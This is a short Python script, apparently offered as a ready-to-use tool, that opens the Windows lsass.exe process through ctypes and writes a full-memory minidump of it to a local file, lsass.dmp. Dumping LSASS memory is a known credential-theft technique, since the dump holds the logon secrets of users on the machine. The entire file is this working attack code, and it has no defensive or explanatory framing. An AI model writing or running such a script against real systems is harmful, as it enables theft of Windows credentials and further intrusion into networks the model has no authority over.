import ctypes
import ctypes.wintypes as wintypes

# Windows API Constants and Structures
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
INVALID_HANDLE_VALUE = -1
CREATE_ALWAYS = 2
FILE_ATTRIBUTE_NORMAL = 0x80
MiniDumpWithFullMemory = 2

# Load DLLs
dbghelp = ctypes.WinDLL("Dbghelp.dll")
kernel32 = ctypes.WinDLL("Kernel32.dll")

# Function prototypes
OpenProcess = kernel32.OpenProcess
OpenProcess.restype = wintypes.HANDLE
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]

CreateFile = kernel32.CreateFileW
CreateFile.restype = wintypes.HANDLE
CreateFile.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]

MiniDumpWriteDump = dbghelp.MiniDumpWriteDump
MiniDumpWriteDump.restype = wintypes.BOOL
MiniDumpWriteDump.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.LPVOID, wintypes.LPVOID]

# Replace <lsass_process_id> with the actual process ID of lsass.exe
lsass_pid = 964

# Open LSASS process
hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, lsass_pid)
if hProcess <= 0:
    print(f"Failed to open process: {kernel32.GetLastError()}")
    exit(1)

# Create dump file
dumpFileName = "lsass.dmp"
hDumpFile = CreateFile(dumpFileName, 0x40000000, 0, None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None)
if hDumpFile == INVALID_HANDLE_VALUE:
    print(f"Failed to create dump file: {kernel32.GetLastError()}")
    kernel32.CloseHandle(hProcess)
    exit(1)

# Write minidump
success = MiniDumpWriteDump(hProcess, lsass_pid, hDumpFile, MiniDumpWithFullMemory, None, None, None)
if not success:
    print(f"Failed to create minidump: {kernel32.GetLastError()}")

# Close handles
kernel32.CloseHandle(hDumpFile)
kernel32.CloseHandle(hProcess)
